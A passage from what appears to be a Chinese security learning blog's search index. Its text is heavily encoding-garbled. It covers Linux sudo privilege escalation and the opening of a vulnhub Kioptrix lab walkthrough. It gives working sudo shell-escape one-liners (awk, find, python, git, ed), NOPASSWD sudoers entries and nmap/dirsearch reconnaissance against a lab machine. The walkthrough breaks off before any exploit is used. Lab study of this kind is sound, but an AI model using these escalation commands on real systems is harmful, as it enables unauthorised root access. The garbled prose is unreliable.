æƒé™ç»•è¿‡æ¼æ´ï¼ˆå¤ç°è¿‡ç¨‹ï¼‰ linux ææƒ-sudoææƒ","tags":["CVE"],"categories":["CVEæ¼æ´"]},{"title":"linux ææƒ-sudoææƒ","path":"/2023/09/23/linux-ti-quan-sudo-ti-quan/","content":"0x01 å‰è¨€ æ­¤æ¬¡ä¸ºvulnhubé¶åœºä¸­æ‰€ä¸ç†Ÿæ‚‰çš„çŸ¥è¯†ç‚¹ï¼Œå€Ÿæ­¤æ¥å­¦ä¹ ä¸€ç•ª 0x02 sudoç®€ä»‹ sodo å…¨ç§° Substitute User and Doï¼Œç”¨æ¥ä¸´æ—¶èµ‹äºˆrootæƒé™è¿è¡ŒæŸä¸ªç¨‹åºï¼Œæ˜¯linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œæ˜¯å…è®¸ç³»ç»Ÿç®¡ç†å‘˜è®©æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›æˆ–è€…å…¨éƒ¨çš„rootå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ï¼Œå¦‚haltï¼Œrebootï¼Œsuç­‰ç­‰ã€‚æ¢å¥è¯è¯´é€šè¿‡æ­¤å‘½ä»¤å¯ä»¥è®©érootçš„ç”¨æˆ·è¿è¡Œåªæœ‰rootæ‰æœ‰æƒé™æ‰§è¡Œçš„å‘½ä»¤ã€‚ sudo çš„æ‰§è¡ŒåŸç†ï¼š æ™®é€šç”¨æˆ·æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œé¦–å…ˆæ£€æŸ¥/var/run/sudo/ç›®å½•ä¸‹æ˜¯å¦æœ‰ç”¨æˆ·æ—¶é—´æˆ³ï¼Œcentosæ£€æŸ¥/var/db/sudo/ç›®å½•ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦è¿‡æœŸã€‚ å¦‚æœæ—¶é—´æˆ³è¿‡æœŸï¼Œå°±éœ€è¦è¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç ã€‚è¾“å…¥åæ£€æŸ¥/etc/sudoersé…ç½®æ–‡ä»¶ï¼ŒæŸ¥çœ‹ç”¨æˆ·æ˜¯å¦æœ‰sudoæƒé™ï¼Œå¦‚æœæœ‰ï¼Œæ‰§è¡Œsudoå‘½ä»¤å¹¶è¿”å›ç»“æœï¼Œç„¶åé€€å‡ºsudoè¿”å›åˆ°æ™®é€šç”¨æˆ·çš„shellç¯å¢ƒã€‚ è€Œåœ¨/etc/sudoersä¸­è®¾ç½®å¯æ‰§è¡ŒsudoæŒ‡ä»¤çš„ç”¨æˆ·ã€‚é»˜è®¤åªæœ‰rootã€‚ ![image-20230923214502376](linux ææƒ-sudoææƒ/image-20230923214502376.png) æ˜¯ä¸æ˜¯æ¯ä¸€ä¸ªæ–°åˆ›å»ºçš„ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨sudoæå‡å‘½ä»¤çš„æƒé™å‘¢ï¼Ÿå¦‚æœä¸æ˜¯é‚£ä¹ˆå“ªäº›ç”¨æˆ·å¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤å‘¢ï¼Ÿè¦æƒ³ä½¿ä¸€ä¸ªç”¨æˆ·å…·æœ‰ä½¿ç”¨sudoçš„èƒ½åŠ›ï¼Œéœ€è¦è®©rootç”¨æˆ·å°†å…¶åå­—ã€å¯ä»¥æ‰§è¡Œçš„ç‰¹å®šå‘½ä»¤ã€æŒ‰ç…§å“ªç§ç”¨æˆ·æˆ–ç”¨æˆ·ç»„çš„èº«ä»½æ‰§è¡Œç­‰ä¿¡æ¯æ³¨å†Œåˆ°/etc/sudoersæ–‡ä»¶ä¸­ï¼Œå³å®Œæˆå¯¹è¯¥ç”¨æˆ·çš„æˆæƒï¼ˆæ­¤æ—¶è¯¥ç”¨æˆ·ç§°ä¸ºâ€œsudoerâ€ï¼‰æ‰å¯ä»¥ã€‚ å½“ä¸€èˆ¬ç”¨æˆ·æ‰§è¡Œç‰¹æ®Šæƒé™æ—¶ï¼Œåœ¨å‘½ä»¤å‰åŠ ä¸Š sudoï¼Œæ­¤æ—¶ç³»ç»Ÿä¼šè®©ä½ è¾“å…¥å¯†ç ä»¥ç¡®è®¤ç»ˆç«¯æœºå‰æ“ä½œçš„æ˜¯ä½ æœ¬äººï¼Œç¡®è®¤åç³»ç»Ÿä¼šå°†è¯¥å‘½ä»¤çš„è¿›ç¨‹ä»¥è¶…çº§ç”¨æˆ·çš„æƒé™è¿è¡Œã€‚ åœ¨ä¸€å®šçš„æ—¶é—´æ®µå†…ï¼Œå†æ¬¡æ‰§è¡Œsudoçš„å‘½ä»¤æ—¶ä¸å†è¯¢é—®å¯†ç ï¼Œè¶…å‡ºæ­¤æ—¶é—´æ®µï¼ˆä¸€èˆ¬ä¸º5åˆ†é’Ÿï¼‰åéœ€è¦å†æ¬¡è¾“å…¥å¯†ç ã€‚ åœ¨Linux/Unixä¸­ï¼Œ/etc/sudoersæ–‡ä»¶æ˜¯sudoæƒé™çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­å‚¨å­˜äº†ä¸€äº›ç”¨æˆ·æˆ–ç»„å¯ä»¥ä»¥rootæƒé™ä½¿ç”¨çš„å‘½ä»¤ã€‚å¦‚ä¸‹å›¾![image-20230924091340555](linux ææƒ-sudoææƒ/image-20230924091340555.png) 0x03 Sudoeræ–‡ä»¶è¯­æ³• 3.1 ç»™ç”¨æˆ·èµ‹äºˆå…¨éƒ¨rootæƒé™ æ‰¾åˆ°rootæƒé™root ALL=(ALL:ALL) ALLï¼Œåœ¨ä¸‹ä¸€è¡Œè¾“å…¥\" test ALL(ALL:ALL) ALL \"ï¼Œä¿å­˜åé€€å‡ºï¼Œè¿™æ ·å³è¡¨ç¤ºç”¨æˆ·testå¯ä»¥ä½¿ç”¨sudoè°ƒç”¨rootæƒé™æ‰§è¡Œå‘½ä»¤ã€‚å³æ­¤æ—¶testç”¨æˆ·ç›¸å½“äºrootäº† ![image-20230924091502925](linux ææƒ-sudoææƒ/image-20230924091502925.png) 3.2 ç»™äºˆç”¨æˆ·éƒ¨åˆ†æƒé™ hackerç”¨æˆ·å°±èƒ½ä½¿ç”¨awkå‘½ä»¤äº† ![image-20230924091531982](linux ææƒ-sudoææƒ/image-20230924091531982.png) 3.3 æŸ¥çœ‹ç”¨æˆ·èƒ½ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤ sudo -l //ä¸€èˆ¬éƒ½å¾—è¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç æ‰å¯ä»¥ä½¿ç”¨ 0x04 sudo å¸¸è§„ææƒ å¦‚æœæ”»å‡»è€…çŸ¥é“å½“å‰ç”¨æˆ·å¯†ç ï¼Œå°±å¯ä»¥åˆ©ç”¨sudoæ‰§è¡Œå‘½ä»¤ææƒã€‚ å¦‚ï¼š å¯ä»¥åˆ©ç”¨sudoææƒçš„å‘½ä»¤å¦‚ä¸‹ wgetã€findã€catã€aptã€zipã€xxdã€timeã€tasksetã€gitã€sedã€pipã€edã€tmuxã€scpã€perlã€bashã€lessã€awkã€manã€viã€envã€ftpã€edã€screen æ·»åŠ éƒ¨åˆ†å‘½ä»¤ç”¨äºæµ‹è¯•sudoææƒ vim /etc/sudoers hacker ALL=(root) NOPASSWD: /usr/bin/awk hacker ALL=(root) NOPASSWD: /usr/bin/vim hacker ALL=(root) NOPASSWD: /usr/bin/man hacker ALL=(root) NOPASSWD: /usr/bin/apache2 hacker ALL=(root) NOPASSWD: /usr/bin/less hacker ALL=(root) NOPASSWD: /bin/more hacker ALL=(root) NOPASSWD: /usr/bin/find hacker ALL=(root) NOPASSWD: /usr/bin/zip hacker ALL=(root) NOPASSWD: /usr/bin/git ![image-20230924093750842](linux ææƒ-sudoææƒ/image-20230924093750842.png) å‡è®¾è·å–äº†ä¸€ä¸ªæ™®é€šç”¨æˆ·hackerçš„æƒé™ï¼Œæ¥ç€åˆ©ç”¨sudoè¿›è¡Œææƒ è¿™é‡Œæˆ‘ä»¬å…ˆåˆ‡æ¢åˆ°hackerç”¨æˆ· sudo useradd -m hacker //åˆ›å»ºæ–°ç”¨æˆ· sudo passwd hacker //ç»™ç”¨æˆ·è®¾ç½®å¯†ç  su hacker //è½¬åˆ°æ–°ç”¨æˆ·ä¸‹ 4.1 awk å‘½ä»¤ææƒ æŸ¥çœ‹sudo - ![image-20230924094304256](linux ææƒ-sudoææƒ/image-20230924094304256.png) æ˜¾ç¤ºäº†å…è®¸å½“å‰ç”¨æˆ·ä½¿ç”¨çš„å‘½ä»¤ï¼Œå¦‚ä¸‹å‘ç°äº†å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œawkå‘½ä»¤å¹¶ä¸”ä¸éœ€è¦å¯†ç  æƒé™æå‡ æ‰§è¡Œä¸‹é¢ä»£ç ç›´æ¥åˆ‡æ¢åˆ°rootç”¨æˆ·äº†ï¼Œæ— éœ€å¯†ç  sudo awk 'BEGIN{system(\"/bin/bash\")}' ![image-20230924094409631](linux ææƒ-sudoææƒ/image-20230924094409631.png) 4.2 find å‘½ä»¤ææƒ sudo find . -exec /bin/sh \\; -quit ![image-20230923214734214](linux ææƒ-sudoææƒ/image-20230923214734214.png) 4.3 git å‘½ä»¤ææƒ sudo git help add ![image-20230924100456480](linux ææƒ-sudoææƒ/image-20230924100456480.png) å¦‚ä¸Šå›¾ï¼Œå›è½¦ä¹‹åè¾“å…¥!/bin/bashï¼Œè·å¾—æƒé™ ![image-20230924100549094](linux ææƒ-sudoææƒ/image-20230924100549094.png) 4.4 ed å‘½ä»¤ææƒ sudo ed ä¹‹å !/bin/sh ![image-20230924100904152](linux ææƒ-sudoææƒ/image-20230924100904152.png) 4.5 python å‘½ä»¤ææƒ sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' ![image-20230923214759200](linux ææƒ-sudoææƒ/image-20230923214759200.png) ![image-20230923215240847](linux ææƒ-sudoææƒ/image-20230923215240847.png) è¿™é‡Œcentosä¸kaliéƒ½è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°kaliä¸éœ€è¦ç™»å½•å¯†ç ï¼Œä¸è¿‡è½¬å¤´ä¸€æƒ³è¿™åº”è¯¥å°±æ˜¯kaliæˆ‘åˆšææƒäº†ä¸€ä¸‹ï¼Œå­˜åœ¨çš„æ—¶é—´æˆ³è¿˜æœªè¿‡æœŸè€Œå·² æˆ–è€…ç®¡ç†å‘˜åœ¨/etc/sudoersé…ç½®äº†æŸäº›å‘½ä»¤å…å¯†ç ä½¿ç”¨ã€‚ å¦‚è®¾ç½®apt-getå‘½ä»¤sudoæ—¶ä¸éœ€è¦å¯†ç ã€‚ cseroad ALL=(ALL:ALL) NOPASSWD:/usr/bin/apt-get cseroadè¡¨ç¤ºç”¨æˆ·å ç¬¬ä¸€ä¸ª ALL æŒ‡ç¤ºå…è®¸ä»ä»»ä½•ç»ˆç«¯è®¿é—®sudo ç¬¬äºŒä¸ª (ALL:ALL)æŒ‡ç¤ºsudoå‘½ä»¤è¢«å…è®¸ä»»æ„ç”¨æˆ·ã€ä»»æ„ç»„æ‰§è¡Œ ç¬¬ä¸‰ä¸ª NOPASSWD è¡¨ç¤ºä¸éœ€è¦è¾“å…¥å¯†ç è€Œå¯ä»¥sudoæ‰§è¡Œçš„å‘½ä»¤ å†è¿›è¡Œæµ‹è¯•ï¼Œsudo pythonç­‰å‘½ä»¤éœ€è¦å¯†ç ï¼Œè€Œè®¾ç½®çš„apt-getä¸éœ€è¦å¯†ç ã€‚ ![image-20230923220942463](linux ææƒ-sudoææƒ/image-20230923220942463.png) è¿™é‡Œæˆ‘å´ç¿»è½¦äº†ï¼Œæˆ‘è¿™é‡Œæ˜¯éœ€è¦å¯†ç çš„ï¼Œæˆ–è®¸æ˜¯æˆ‘çš„é…ç½®æ–‡ä»¶ä¸æ˜¯ä¸€èˆ¬çš„ï¼ˆ^_^ï¼‰ ä¸è¿‡æˆ‘ä»¬æ˜ç™½å…¶ä¸­åŸç†å³å¯ï¼Œæ¥ä¸‹æ¥æ˜¯ä¸Šè¿°æ–¹æ³•æˆåŠŸçš„ç»“æœ ![image-20230924090729032](linux ææƒ-sudoææƒ/image-20230924090729032.png) é‚£å°±å¯ä»¥ä¸éœ€è¦è¾“å…¥å¯†ç åˆ©ç”¨apt-getå‘½ä»¤æ¥ææƒã€‚ ![image-20230924090742973](linux ææƒ-sudoææƒ/image-20230924090742973.png) ä½†æ˜¯æƒ³è·å–å“ªäº›å‘½ä»¤è®¾ç½®äº†æ— å¯†ç sudoï¼Œè¿˜æ˜¯éœ€è¦æŸ¥çœ‹cat /etc/sudoersæ–‡ä»¶æˆ–è€…sudo -lå‘½ä»¤ï¼Œè€Œè¿™ä¸¤æ¡å‘½ä»¤éƒ½éœ€è¦ä¸€å®šæƒé™æˆ–è€…çŸ¥é“å½“å‰ç”¨æˆ·å¯†ç ã€‚ ![image-20230924090832054](linux ææƒ-sudoææƒ/image-20230924090832054.png) æœä¸å…¶ç„¶ï¼Œæœ‰ç‚¹é¸¡è‚‹ æ›´å¤šå‘½ä»¤sudoææƒå‚è€ƒï¼šhttps://gtfobins.github.io/ æ€»çš„æ¥è¯´è¿™äº›ææƒæ–¹æ³•éƒ½æ˜¯éšæœºåº”å˜ï¼Œåªè¦æ¸…æ¥šå½“ä¸‹ç”¨æˆ·çš„æƒé™æƒ…å†µï¼Œæ‰¾åˆ°å¯¹åº”æ–¹æ³•å³å¯ã€‚ 0x05 å®æˆ˜ä½“éªŒ è¿™é‡Œå°±å•ç‹¬æ”¾ä¸¤ç¯‡æ–‡ç« æ¥å†™å§ 5.1 CVE-2019-14287 5.2 CVE-2021-3156 0x06 å‚è€ƒæ–‡ç«  Linuxææƒä¹‹sudoææƒ sudoææƒ linux ææƒ-sudoææƒ","tags":["Linux ææƒ"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"vulnhub-kioptrix_level 1.2","path":"/2023/09/23/kioptrix-level-1.2/","content":"0x01 å‰è¨€ æœ€è¿‘ä¹Ÿæ˜¯å­¦äº†å†…ç½‘ä¸€æ®µæ—¶é—´ï¼Œä½†æ¯”è¾ƒè¿·èŒ«ï¼Œä¸çŸ¥ä»å“ªé‡Œä¸‹æ‰‹ï¼Œç”šè‡³æƒ³è€ƒè™‘ä¹°è¯¾æ¥å­¦äº†ï¼Œä½†æ˜¯è€ƒè™‘åˆ°èŠ±é’±-.-äºæ˜¯é—®äº†å‡ ä¸ªå¤§ä½¬è¯´æ˜¯å…ˆåˆ·ç€å†…ç½‘é¶åœºï¼Œåœ¨é¶åœºä¸­å­¦ä¹ å†…ç½‘çŸ¥è¯†ç‚¹ï¼Œæ¯”å¦‚vulnhubï¼Œæš—æœˆé¶åœºç­‰ç­‰ã€‚è¿˜æ˜¯é‚£å¥è¯ï¼Œå³ä½¿è¿·èŒ«ä¹Ÿä¸è¦åœä¸‹å­¦ä¹ çš„è„šæ­¥ï¼Œè¯´ä¸å®šå°±æç„¶å¤§æ‚Ÿäº†ã€‚ã€‚ã€‚ è¯ä¸å¤šè¯´ï¼Œå¼€å§‹æœ¬äººvulnhubé¶åœºçš„åˆ·é¢˜ä¹‹æ—… 0x02 é¶åœºç¯å¢ƒ æ”»å‡»æœºï¼ˆkaliï¼‰ï¼š192.168.17.137 é¶æœºä¸‹è½½åœ°å€ï¼šhttps://www.vulnhub.com/entry/kioptrix-level-12-3,24/ kali ä¸é¶æœºä¸ºåŒç§ç½‘ç»œæ¨¡å¼ï¼ˆæ­¤å¤„å‡ä¸º NAT æ¨¡å¼ï¼‰ è¿™é‡Œä¹Ÿæ˜¯èŠ±äº†è€é•¿æ—¶é—´ï¼Œæˆ‘ä»¥ä¸ºæ­å»ºä¹Ÿéœ€è¦æŠ€æœ¯å‘¢ï¼Œæœäº†åŠå¤©å‘ç°ä¹Ÿæ²¡äººè¯´å¦‚ä½•æ­å»ºï¼Œåªæ˜¯è¯´æ”»å‡»æœºä¸é¶æœºä¸€å®šè¦åœ¨åŒä¸€ipæ®µä¸‹ï¼Œæˆ‘ä¹Ÿæ˜¯ç›´æ¥ä¸‹è½½åç”¨vmè™šæ‹Ÿæœºç›´æ¥æ‰“å¼€æ–‡ä»¶å¤¹é‡Œçš„vmxæ–‡ä»¶ï¼Œæ¥ç€æ¢ä¸ºNATæ¨¡å¼ï¼Œæ‰“å¼€ä¹‹åå‘ç°è¿˜è¦ç™»å½•ï¼Œæˆ‘å¯»æ€å¯†ç å‘¢ï¼Ÿæƒ³äº†ä¸€ä¸‹ï¼Œè¯´ä¸å®šè¿™ä¸ªå¯†ç å°±æ˜¯æˆ‘ä»¬è¦è·å–çš„ã€‚å…ˆåšç€è¯•è¯•çœ‹ 0x03 é¶åœºæ¸—é€ 3.1 ä¿¡æ¯æœé›† å½“ç„¶æˆ‘ä»¬æ­¤æ—¶è¦æ¸…æ¥šæ¸—é€æµç¨‹ï¼Œå½“ç„¶ç¬¬ä¸€æ­¥å°±æ˜¯ä¿¡æ¯æœé›†â€”è¿™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡å®æˆ˜ï¼Œè‚¯å®šå¤§éƒ¨åˆ†éƒ½æ˜¯wpçœ‹çš„ï¼Œè´¨é‡è‚¯å®šä½ï¼ˆå‘œå‘œï¼Œå¤ªèœäº†~~ï¼‰ è¿™é‡Œè·Ÿç€wpå°†æµç¨‹å¥½å¥½ç†Ÿæ‚‰ä¸€ä¸‹ï¼Œä¸‹æ¬¡æ‰“çš„æ—¶å€™äº‰å–å°‘çœ‹wpï¼ï¼ï¼â€”äº‰å–å‘½ä»¤éƒ½æ˜¯æ‰‹æ•² æ¢æµ‹å­˜æ´»ä¸»æœº netdiscover -r 192.168.17.0/24 ![image-20230923191442890](kioptrix_level 1.2/image-20230923191442890.png) è¿™é‡Œæœé›†äº†å››ä¸ªemmmï¼Œç›²çŒœå°±æ˜¯ç¬¬ä¸‰ä¸ªï¼Œæ¯•ç«Ÿå‰©ä½™ä¸‰ä¸ªå¾ˆå¥‡æ€ª ç«¯å£æ‰«æ nmap -sS -sV -A -p 1-65535 192.168.17.143 é¡ºä¾¿ç†Ÿæ‚‰ä¸€ä¸‹nmapå‘½ä»¤çš„å‚æ•°ç»†èŠ‚ â€“ æŠ“å¸¸ç”¨çš„ 1.æ‰«æå•ä¸ªç›®æ ‡åœ°å€ nmap 192.168.0.107 2.æ‰«æå¤šä¸ªç›®æ ‡åœ°å€ï¼Œå¦‚æœç›®æ ‡åœ°å€ä¸åœ¨åŒä¸€ç½‘æ®µï¼Œæˆ–åœ¨åŒä¸€ç½‘æ®µä½†ä¸è¿ç»­ä¸”æ•°é‡ä¸å¤šï¼Œå¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œæ‰«æã€‚ nmap 192.168.0.100 192.168.0.107 3.æ‰«æä¸€ä¸ªèŒƒå›´å†…çš„ç›®æ ‡åœ°å€ nmap 192.168.0.100-110 å¯ä»¥æŒ‡å®šæ‰«æä¸€ä¸ªè¿æ¥çš„ç½‘æ®µï¼Œä¸­é—´ä½¿ç”¨â€œ-â€è¿æ¥ 4.æ‰«æç›®æ ‡åœ°å€æ‰€åœ¨çš„æŸä¸ªç½‘æ®µ ä»¥Cæ®µä¸ºä¾‹ï¼Œå¦‚æœç›®æ ‡æ˜¯ä¸€ä¸ªç½‘æ®µï¼Œåˆ™å¯ä»¥é€šè¿‡æ·»åŠ å­ç½‘æ©ç çš„æ–¹å¼æ‰«æï¼Œä¸‹åˆ—å‘½ä»¤è¡¨ç¤ºæ‰«æèŒƒå›´ä¸ºï¼š192.168.0.1-182.168.0.255 nmap 192.168.0.0/24 5.æ‰«æä¸»æœºåˆ—è¡¨targets.txtä¸­æ‰€æœ‰ç›®æ ‡çš„åœ°å€ nmap -iL C:\\Users\\targets.txt -iL ä»æ–‡ä»¶ä¸­å¯¼å…¥ç›®æ ‡ä¸»æœºæˆ–è€…ç›®æ ‡ç½‘æ®µ //åŒä¸€ç›®å½•ä¸‹å¯ä»¥ä¸ç”¨ç»å¯¹è·¯å¾„ 6.æ‰«æé™¤æŸä¸€ä¸ªç›®æ ‡åœ°å€ä¹‹å¤–çš„æ‰€æœ‰ç›®æ ‡åœ°å€ nmap 192.168.0.100/24 -exclude 192.168.0.107 //-exclude:åé¢è·Ÿçš„ä¸»æœºæˆ–ç½‘æ®µå°†ä¸åœ¨æ‰«æçš„èŒƒå›´å†… 7.æ‰«æé™¤æŸä¸€ä¸ªæ–‡ä»¶ä¸­çš„ç›®æ ‡åœ°å€ä¹‹å¤–çš„ç›®æ ‡åœ°å€ nmap 192.168.0.100/24 -excludefile C:\\Users\\targets.txt //-excludefile å¯¼å…¥æ–‡ä»¶ä¸­çš„ä¸»æœºæˆ–ç½‘æ®µå°†ä¸åœ¨æ‰«æèŒƒå›´å†… 8.æ‰«ææŸä¸€ä¸ªç›®æ ‡åœ°å€çš„21ï¼Œ22ï¼Œ23ï¼Œ80ç«¯å£ å¦‚æœä¸éœ€è¦å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œåªæƒ³æ¢æµ‹å®ƒæ˜¯å¦å¼€å¯æŸä¸€ç«¯å£ï¼Œé‚£ä¹ˆä½¿ç”¨-på‚æ•°æŒ‡å®šç«¯å£å·ï¼Œå°†å¤§å¤§æé«˜æ‰«æé€Ÿåº¦ã€‚ nmap 192.168.0.107 -p 21,22,23,80 //-pæŒ‡å®šç«¯å£ 9.å¯¹ç›®æ ‡åœ°å€è¿›è¡Œè·¯ç”±æ”»å‡» nmap --traceroute 192.168.0.10 //--traceroute è¿½è¸ªæ¯ä¸ªè·¯ç”±èŠ‚ç‚¹ 10.æ‰«æç›®æ ‡åœ°å€æ‰€åœ¨çš„Cæ®µçš„åœ¨çº¿çŠ¶æ€ nmap -sP 192.168.0.107/24 nmap -sn 192.168.0.107/24 //è¿™ä¸ªä¸¤ä¸ªå‘½ä»¤éƒ½æ˜¯è¿›è¡Œä¸»æœºå‘ç°ï¼Œ-sP/-sn å…³é—­ä¸»æœºæ‰«æ å®ç°ping åŠŸèƒ½ 11.å¯¹æ“ä½œç³»ç»ŸæŒ‡çº¹çš„è¯†åˆ« nmap -O 192.168.0.107 //-O å¯¹æ“ä½œç³»ç»ŸæŒ‡çº¹çš„è¯†åˆ« 12.ç›®æ ‡åœ°å€æä¾›çš„æœåŠ¡ç‰ˆæœ¬æ£€æµ‹ nmap -sV 192.168.0.107 //-sV è®©nmapè¿›è¡Œç‰ˆæœ¬æ¢æµ‹ 13.æ¢æµ‹é˜²ç«å¢™çŠ¶æ€ nmap -sF -T4 192.168.0.107 //-sFè¿›è¡ŒFINæ¢æµ‹ -T -T4æŒ‡å®šæ‰«æè¿‡ç¨‹ä½¿ç”¨çš„æ—¶åºï¼Œæ€»å…±æœ‰6ä¸ªçº§åˆ«ï¼ˆ0-5ï¼‰çº§åˆ«è¶Šé«˜æ‰«æé€Ÿåº¦è¶Šå¿«ï¼Œä½†æ˜¯ä¹Ÿå®¹æ˜“è¢«é˜²ç«å¢™æ£€æµ‹å¹¶å±è”½æ‰ï¼Œåœ¨ç½‘ç»œæƒ…å†µè¾ƒå¥½çš„æ˜¯å¯ä»¥ä½¿ç”¨T4 å‰©ä¸‹çš„å°±æ˜¯å‘½ä»¤ç»„åˆçš„äº† å…·ä½“å¯å‚è€ƒï¼šnmapå¸¸ç”¨å‘½ä»¤è¯¦ç»†ä½¿ç”¨|å‘½ä»¤å¸¦å®ä¾‹ --è¿™é‡Œç®€å•è¿‡ä¸€ä¸‹ï¼Œæ—¥åç”¨çš„æ—¶å€™çœ‹ç€ç”¨ï¼Œç†Ÿç»ƒå°±å¥½äº† ![image-20230923192950046](kioptrix_level 1.2/image-20230923192950046.png) æ‰«åˆ°å¦‚ä¸Šä¿¡æ¯ï¼Œæ¥ç€çœ‹ä¸€ä¸‹é¶æœºé™„å¸¦æ–‡ä»¶ç»™çš„ä¿¡æ¯ ![image-20230923193028820](kioptrix_level 1.2/image-20230923193028820.png) è¿™é‡Œæ²¡å’‹æ‡‚ä»–çš„æ„æ€ï¼Œä¼°è®¡æ˜¯ä¿®æ”¹åŸŸåè§£æå§ï¼Œæˆ‘ä»¬çœ‹çœ‹wp wpï¼šæŒ‰æç¤ºæ·»åŠ  host è®°å½•åˆ°æ”»å‡»æœºï¼šsudo nano /etc/hosts æ²¡ç”¨è¿‡è¿™ä¸ªå‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ç”¨vimäº†vim /etc/hostsï¼Œæ·»åŠ å†…å®¹ï¼š192.168.17.143 kioptrix3.com ![image-20230923193441839](kioptrix_level 1.2/image-20230923193441839.png) è¿™é‡Œæ–°kaliæ²¡dirsearchï¼Œç­‰æˆ‘ä¸‹è½½ä¸€ä¸‹ï¼Œè¿™é‡Œåˆçœ‹åˆ°ä¸€ä¸ªå°tip 192.168.233.1 vm8ç½‘å¡ 192.168.233.2 ç½‘å…³ 192.168.233.177 é¶æœº 192.168.233.254 DHCPæœåŠ¡å™¨ æ•…æ­¤æˆ‘ä»¬çŒœçš„æ˜¯å¯¹çš„ webç›®å½•æ‰«æ ä½¿ç”¨ dirsearch è¿›è¡Œç›®å½•æ‰«æï¼šdirsearch -u http://kioptrix3.com -x 400-599 -t 50 æ­¤å¤„-xæ˜¯ä¸ºäº†æ’é™¤é¡µé¢400-599çš„çŠ¶æ€ç å›æ˜¾ï¼Œ-tä¸ºè®¾ç½®çº¿ç¨‹æ•°ï¼Œä¸è¿‡ä¼¼ä¹ä¸è®¾ç½® hostsç›´æ¥æ‰«ipä¹Ÿå¯ä»¥å§ï¼Œä½†è¯´ä¸å®šåç»­æœ‰ç”¨ï¼Ÿ ![image-20230923194338037](kioptrix_level 1.2/image-20230923194338037.png) è®¿é—®äº†ä¸€ä¸‹ï¼Œå‘ç°å·²ç»æœ‰äº†webç½‘ç«™äº†ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹æ‰«å‡ºçš„ç»“æœï¼Œä¸€ä¸ªä¸ªè®¿é—®çœ‹çœ‹æœ‰ä»€ä¹ˆæƒ³ä¿¡æ¯ [19:43:15] 200 - 2KB - /cache/ [19:43:15] 301 - 353B - /cache -&gt; http://kioptrix3.com/cache/ [19:43:18] 200 - 688B - /core/fragments/moduleInfo.phtml [19:43:18] 301 - 352B - /core -&gt; http://kioptrix3.com/core/ [19:43:23] 200 - 23KB - /favicon.ico [19:43:24] 301 - 355B - /gallery -&gt; http://kioptrix3.com/gallery/ [19:43:27] 200 - 2KB - /index.php [19:43:27] 200 - 2KB - /index.php/login/ [19:43:33] 200 - 2KB - /modules/ [19:43:33] 301 - 355B - /modules -&gt; http://kioptrix3.com/modules/ [19:43:37] 301 - 358B - /phpmyadmin -&gt; http://kioptrix3.com/phpmyadmin/ [19:43:38] 200 - 8KB - /phpmyadmin/ [19:43:38] 200 - 8KB - /phpmyadmin/index.php [19:43:46] 301 - 353B - /style -&gt; http://kioptrix3.com/style/ [19:43:49] 200 - 18B - /update.php ![image-20230923194820587](kioptrix_level 1.2/image-20230923194820587.png) è®¿é—®äº†ä¸€ä¸‹ï¼Œç›´æ¥ç”¨adminå°±ç™»è¿›å»äº† ![image-20230923194938034](kioptrix_level 1.2/image-20230923194938034.png) ä¸è¿‡ä¼¼ä¹æ²¡å•¥ä¿¡æ¯ï¼Œæ¥ç€çœ‹äº†update.phpï¼Œå‘ç°æ— æƒè®¿é—®ï¼Œè¿™é‡Œè‚¯å®šæœ‰é—®é¢˜ ![image-20230923195108757](kioptrix_level 1.2/image-20230923195108757.png) æ¥ç€çœ‹äº†modulesç›®å½•ï¼Œå±•ç¤ºäº†æ­¤ç½‘ç«™ç›®å½•ç»“æ„ ![image-20230923195459051](kioptrix_level 1.2/image-20230923195459051.png) æ€»çš„æ¥è¯´ï¼Œæ²¡å•¥æ€è·¯äº†â”­â”®ï¹â”­â”®ï¼Œçœ‹wpå§ webç½‘ç«™æŒ‡çº¹æ‰«æ é’ˆå¯¹ web é¡µé¢è¿›è¡Œä¿¡æ¯æœé›†ï¼Œä½¿ç”¨ whatweb æ‰«æç½‘ç«™ä¿¡æ¯ï¼šwhatweb http://kioptrix3.com ![image-20230923200117955](kioptrix_level 1.2/image-20230923200117955.png) å‘ç°å…³é”®è¯ï¼ŒlotusCMSï¼Œç›´è§‰å‘Šè¯‰æˆ‘æ­¤å¤„å¿…æœ‰æ¼æ´ï¼Œæœäº†ä¸€ç•ªå‘ç°æ­¤ç³»ç»Ÿæœ‰ä¸€ä¸ªRCEæ¼æ´ï¼Œç›´æ¥å°†å…¶expå…ˆä¸‹è½½ä¸€ä¸‹ï¼Œæ¥ç€çœ‹çœ‹ç½‘ç«™é‚£é‡Œå­˜åœ¨CMS ![image-20230923200516077](kioptrix_level 1.2/image-20230923200516077.png) åœ¨è®¿é—®åé¡µé¢æœ‰ä¸ªloginç‚¹å‡»å‘ç°ï¼Œæ­¤ç™»å½•åŠŸèƒ½é‡‡ç”¨çš„å°±æ˜¯ä¸Šè¿°CMSï¼Œçœ‹äº†wpæœ‰å¦‚ä¸‹æ€è·¯ é€šè¿‡ searchsploit æŸ¥è¯¢æ­¤ CMS ç›¸å…³æ¼æ´ï¼šsearchsploit lotuscms ![image-20230923200651665](kioptrix_level 1.2/image-20230923200651665.png) æ°å¥½è·Ÿæˆ‘æœçš„RCEå¯¹ä¸Šäº†ï¼Œæ¥ç€wpè¯´ï¼šæŸ¥æ‰¾åˆ°å­˜åœ¨ RCE ä½†æ˜¯éœ€è¦ç”¨åˆ° MSFï¼Œä¸ºè´´è¿‘ OSCP è€ƒè¯•ï¼Œå°½é‡ä¸ä½¿ç”¨ 